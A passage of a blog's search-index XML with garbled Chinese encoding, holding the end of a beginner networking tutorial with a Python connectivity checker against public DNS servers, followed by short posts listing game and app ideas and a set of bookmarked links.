class="hljs-string">f&quot;ğŸ“Œ ä¸»æœºå: <span class="hljs-subst">&#123;hostname&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># è·å–æœ¬æœºIPåœ°å€</span><br>    local_ip = get_local_ip()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“ æœ¬æœºIPåœ°å€: <span class="hljs-subst">&#123;local_ip&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># æ£€æµ‹ç½‘ç»œè¿æ¥</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ” æ­£åœ¨æ£€æµ‹ç½‘ç»œè¿æ¥...&quot;</span>)<br><br>    <span class="hljs-comment"># æµ‹è¯•å¤šä¸ªæœåŠ¡å™¨</span><br>    test_servers = [<br>        (<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-string">&quot;Google DNS&quot;</span>),<br>        (<span class="hljs-string">&quot;114.114.114.114&quot;</span>, <span class="hljs-string">&quot;å›½å†…DNS&quot;</span>),<br>        (<span class="hljs-string">&quot;1.1.1.1&quot;</span>, <span class="hljs-string">&quot;Cloudflare DNS&quot;</span>)<br>    ]<br><br>    connected = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> ip, name <span class="hljs-keyword">in</span> test_servers:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æµ‹è¯•è¿æ¥åˆ° <span class="hljs-subst">&#123;name&#125;</span> (<span class="hljs-subst">&#123;ip&#125;</span>)...&quot;</span>, end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">if</span> check_internet_connection(ip):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âœ… æˆåŠŸ&quot;</span>)<br>            connected = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ å¤±è´¥&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">if</span> connected:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ‰ ç½‘ç»œè¿æ¥æ­£å¸¸ï¼&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ è¿™æ„å‘³ç€ä½ çš„ç”µè„‘å¯ä»¥è®¿é—®äº’è”ç½‘ä¸Šçš„å…¶ä»–è®¡ç®—æœºã€‚&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âš ï¸  ç½‘ç»œè¿æ¥å¼‚å¸¸ï¼&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ è¯·æ£€æŸ¥ï¼š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   1. ç½‘çº¿æ˜¯å¦æ’å¥½ï¼Ÿ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   2. WiFiæ˜¯å¦è¿æ¥ï¼Ÿ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   3. è·¯ç”±å™¨æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Ÿ&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> code/day01<br>python day01_network_checker.py<br></code></pre></td></tr></table></figure><h3 id="é¢„æœŸè¾“å‡º">é¢„æœŸè¾“å‡º</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">==================================================<br>                ç½‘ç»œè¿æ¥æ£€æµ‹å·¥å…·<br>==================================================<br><br>ğŸ“Œ ä¸»æœºå: linzhibin-MacBook<br>ğŸ“ æœ¬æœºIPåœ°å€: 192.168.1.100<br><br>ğŸ” æ­£åœ¨æ£€æµ‹ç½‘ç»œè¿æ¥...<br><span class="hljs-code">   æµ‹è¯•è¿æ¥åˆ° Google DNS (8.8.8.8)... âœ… æˆåŠŸ</span><br><span class="hljs-code">   æµ‹è¯•è¿æ¥åˆ° å›½å†…DNS (114.114.114.114)... âœ… æˆåŠŸ</span><br><span class="hljs-code">   æµ‹è¯•è¿æ¥åˆ° Cloudflare DNS (1.1.1.1)... âœ… æˆåŠŸ</span><br><br>ğŸ‰ ç½‘ç»œè¿æ¥æ­£å¸¸ï¼<br>ğŸ’¡ è¿™æ„å‘³ç€ä½ çš„ç”µè„‘å¯ä»¥è®¿é—®äº’è”ç½‘ä¸Šçš„å…¶ä»–è®¡ç®—æœºã€‚<br><br>==================================================<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ä»£ç è¯¦è§£">ğŸ” ä»£ç è¯¦è§£</h2><h3 id="Socketæ˜¯ä»€ä¹ˆï¼Ÿ">Socketæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p><strong>Socket</strong>ï¼ˆå¥—æ¥å­—ï¼‰æ˜¯ç½‘ç»œç¼–ç¨‹çš„åŸºç¡€ï¼Œå¯ä»¥ç†è§£ä¸ºï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Socket</span> <span class="hljs-operator">=</span> ç”µè¯æœº<br><br>å»ºç«‹è¿æ¥   â†’  æ‹¨å·<br>å‘é€æ•°æ®   â†’  è¯´è¯<br>æ¥æ”¶æ•°æ®   â†’  å¬å¯¹æ–¹è¯´è¯<br>å…³é—­è¿æ¥   â†’  æŒ‚æ–­ç”µè¯<br></code></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆç”¨8-8-8-8ï¼Ÿ">ä¸ºä»€ä¹ˆç”¨8.8.8.8ï¼Ÿ</h3><ul><li><code>8.8.8.8</code> æ˜¯Googleæä¾›çš„å…¬å…±DNSæœåŠ¡å™¨</li><li>å®ƒå‡ ä¹24å°æ—¶åœ¨çº¿ï¼Œéå¸¸ç¨³å®š</li><li>å¦‚æœèƒ½è¿æ¥åˆ°å®ƒï¼Œè¯´æ˜ç½‘ç»œæ˜¯é€šçš„</li></ul><h3 id="AF-INET-å’Œ-SOCK-STREAM-æ˜¯ä»€ä¹ˆï¼Ÿ">AF_INET å’Œ SOCK_STREAM æ˜¯ä»€ä¹ˆï¼Ÿ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">socket.AF_INET       <span class="hljs-comment"># ä½¿ç”¨IPv4åœ°å€</span><br>socket.AF_INET6      <span class="hljs-comment"># ä½¿ç”¨IPv6åœ°å€</span><br><br>socket.SOCK_STREAM   <span class="hljs-comment"># TCPåè®®ï¼ˆå¯é ä¼ è¾“ï¼‰</span><br>socket.SOCK_DGRAM    <span class="hljs-comment"># UDPåè®®ï¼ˆå¿«é€Ÿä¼ è¾“ï¼‰</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… è®¡ç®—æœºç½‘ç»œæ˜¯è¿æ¥å¤šå°è®¡ç®—æœºçš„ç³»ç»Ÿ</li><li>âœ… ç½‘ç»œç”±è®¡ç®—æœºã€é€šä¿¡çº¿è·¯å’Œåè®®ç»„æˆ</li><li>âœ… Socketæ˜¯ç½‘ç»œç¼–ç¨‹çš„åŸºç¡€å·¥å…·</li><li>âœ… å¯ä»¥é€šè¿‡è¿æ¥DNSæœåŠ¡å™¨æ¥æ£€æµ‹ç½‘ç»œçŠ¶æ€</li></ol><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><table><thead><tr><th>æ¦‚å¿µ</th><th>è§£é‡Š</th><th>æ¯”å–»</th></tr></thead><tbody><tr><td>è®¡ç®—æœºç½‘ç»œ</td><td>å¤šå°è®¡ç®—æœºäº’è”çš„ç³»ç»Ÿ</td><td>å¿«é€’ç½‘ç»œ</td></tr><tr><td>Socket</td><td>ç½‘ç»œç¼–ç¨‹æ¥å£</td><td>ç”µè¯æœº</td></tr><tr><td>IPåœ°å€</td><td>è®¡ç®—æœºåœ¨ç½‘ç»œä¸­çš„åœ°å€</td><td>å®¶åº­ä½å€</td></tr><tr><td>ç«¯å£</td><td>åº”ç”¨ç¨‹åºçš„æ ‡è¯†å·</td><td>é—¨ç‰Œå·</td></tr></tbody></table><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šä¿®æ”¹ä»£ç ">ç»ƒä¹ 1ï¼šä¿®æ”¹ä»£ç </h3><p>ä¿®æ”¹ç¨‹åºï¼Œè®©å®ƒå¯ä»¥æ£€æµ‹è¿æ¥åˆ°ç™¾åº¦æœåŠ¡å™¨ï¼ˆ220.181.38.148ï¼‰</p><h3 id="ç»ƒä¹ 2ï¼šæ€è€ƒé¢˜">ç»ƒä¹ 2ï¼šæ€è€ƒé¢˜</h3><ol><li>ä¸ºä»€ä¹ˆæˆ‘ä»¬ä½¿ç”¨DNSæœåŠ¡å™¨ï¼ˆç«¯å£53ï¼‰è€Œä¸æ˜¯HTTPæœåŠ¡å™¨ï¼ˆç«¯å£80ï¼‰æ¥æµ‹è¯•ï¼Ÿ</li><li>æœ¬æœºIPåœ°å€å’Œäº’è”ç½‘IPåœ°å€æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 3ï¼šæ‰©å±•åŠŸèƒ½">ç»ƒä¹ 3ï¼šæ‰©å±•åŠŸèƒ½</h3><p>å°è¯•æ·»åŠ åŠŸèƒ½ï¼šæ˜¾ç¤ºè¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨æ‰€éœ€çš„æ—¶é—´ï¼ˆæç¤ºï¼šä½¿ç”¨timeæ¨¡å—ï¼‰</p><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><ul><li>IPåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæ˜å¤©ä¼šè¯¦ç»†è®²è§£ï¼‰</li><li>DNSæ˜¯ä»€ä¹ˆï¼Ÿï¼ˆç¬¬15å¤©ä¼šè¯¦ç»†è®²è§£ï¼‰</li><li>TCPå’ŒUDPæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿï¼ˆç¬¬36å¤©ä¼šè¯¦ç»†è®²è§£ï¼‰</li></ul><h2 id="ğŸ¯-æ˜å¤©é¢„å‘Š">ğŸ¯ æ˜å¤©é¢„å‘Š</h2><p><strong>ç¬¬2å¤©ï¼šç½‘ç»œçš„åˆ†ç±»å’Œæ‹“æ‰‘ç»“æ„</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>LANã€WANã€MANæ˜¯ä»€ä¹ˆï¼Ÿ</li><li>ç½‘ç»œæ‹“æ‰‘ç»“æ„æœ‰å“ªäº›ï¼Ÿ</li><li>å¦‚ä½•ç»˜åˆ¶ç½‘ç»œæ‹“æ‰‘å›¾ï¼Ÿ</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·ï¼Œç½‘ç»œå­¦ä¹ ç¬¬ä¸€æ­¥ï¼</p><p>ğŸ‘‰ <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day02.md">ä¸‹ä¸€å¤©ï¼šç½‘ç»œçš„åˆ†ç±»å’Œæ‹“æ‰‘ç»“æ„</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>about</title>
    <link href="/2025/10/29/about/"/>
    <url>/2025/10/29/about/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€é˜¶æ®µï¼ˆå¿«é€Ÿæå‡è¶£å‘³æ€§ï¼‰ï¼š</p><ol><li>æœºç¼˜ç³»ç»Ÿ - å¢åŠ éšæœºæƒŠå–œ</li><li>è¿æ‹›ç³»ç»Ÿ - è®©æˆ˜æ–—æ›´æœ‰ç­–ç•¥</li><li>çµå…½ç³»ç»Ÿ - å¢åŠ æ”¶é›†è¦ç´ </li></ol><p>ç¬¬äºŒé˜¶æ®µï¼ˆå¢åŠ æ·±åº¦ï¼‰ï¼š<br>4. æ‚Ÿé“ç³»ç»Ÿ - ç­–ç•¥æ€§æˆé•¿<br>5. é“ä¾£ç³»ç»Ÿ - æƒ…æ„ŸæŠ•å…¥<br>6. ç§˜å¢ƒæ¢ç´¢ - å†…å®¹æ‰©å……</p><p>ç¬¬ä¸‰é˜¶æ®µï¼ˆé•¿æœŸç›®æ ‡ï¼‰ï¼š<br>7. æˆå°±ç³»ç»Ÿ - å¢åŠ é‡ç©ä»·å€¼<br>8. è½®å›å¼ºåŒ– - New Game+<br>9. åŠ¨æ€å‰§æƒ… - æå‡å™äº‹å“è´¨</p><p>å°åº”ç”¨æ€è·¯ï¼š</p><p>èšç„¦â€œæ¯æ—¥æƒ…ç»ªæ‰“å¡ï¼‹ç®€æ˜“å»ºè®®â€åº”ç”¨</p><p>æˆ–â€œçŸ­æ—¶æ”¾æ¾ + å‘¼å¸ï¼å†¥æƒ³â€æ¨¡å—ï¼šé€‚åˆç¾å›½ç”¨æˆ·å¿«èŠ‚å¥ç”Ÿæ´»</p><p>å¼ºåŒ– iOS æœ¬åœ°å¤„ç†ï¼‹éšç§ä¿éšœï¼Œä¼šæ˜¯åŠ åˆ†é¡¹</p><p>æœ¬åœ°åŒ–ç¤¾ç¾¤+æ‰‹å¸/è§„åˆ’åº”ç”¨</p><p>ä¸ºä»€ä¹ˆæœ‰æœºä¼šï¼šæ¬§æ´²å¤šä¸ªå›½å®¶è¯­è¨€å¤šæ ·ã€ç”¨æˆ·åå¥½æœ¬åœ°åŒ–æœåŠ¡ï¼›ä¸”â€œè½»é‡è§„åˆ’å·¥å…·â€åœ¨å°åº”ç”¨é‡Œå¥½åˆ‡å…¥ã€‚<br>å°åº”ç”¨æ€è·¯ï¼š</p><p>é’ˆå¯¹æŸå›½ï¼ˆå¦‚å¾·å›½ã€æ³•å›½ã€è¥¿ç­ç‰™ï¼‰å¸‚åœºçš„â€œæœˆåº¦é¢„ç®—è§„åˆ’ï¼‹æ”¯å‡ºå¯è§†åŒ–â€å·¥å…·</p><p>æˆ–â€œå­¦ä¹ æŸè¯­è¨€ï¼æ–‡åŒ–ä¹ æƒ¯â€è¾…åŠ©å·¥å…·ï¼šç»“åˆå½“åœ°èŠ‚æ—¥ã€ä»»åŠ¡æ‰“å¡</p><p>å¼ºè°ƒâ€œæ•°æ®ç•™è®¾å¤‡ç«¯â€â€œéšç§ä¿æŠ¤â€ä½œä¸ºå–ç‚¹</p>]]></content>
    
    
    
    <tags>
      
      <tag>â€œinfo&quot;,&quot;zen&quot;</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>myruls</title>
    <link href="/2025/10/29/myruls/"/>
    <url>/2025/10/29/myruls/</url>
    
    <content type="html"><![CDATA[<p>æ—¥å¸¸æ”¶é›†åˆ°çš„ä¸€äº›å½“æ—¶å¯èƒ½è§‰å¾—æœ‰è¶£çš„ä¸œè¥¿</p><h1>AI</h1><p><a href="https://github.com/B3o/GPTS-Prompt-Collection">æç¤ºè¯æœé›†</a></p><h1>ç´ æ</h1><p><a href="https://github.com/renpy/renpy">å›åˆåˆ¶æ¸¸æˆå¼•æ“</a></p><p><a href="https://github.com/CorentinTh/it-tools">ITå·¥å…·</a></p><p><a href="https://github.com/qdhenry/Claude-Command-Suite">Skills</a></p><p><a href="https://github.com/collections/game-engines">æ¸¸æˆå¼•æ“é›†åˆ</a></p><h1>VPS</h1><p><a href="https://cloud.zheanyun.com">æµ™å®‰äº‘</a></p><p><a href="https://app.cloudcone.com">cloudcone</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>â€œurlâ€,&quot;project&quot;</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
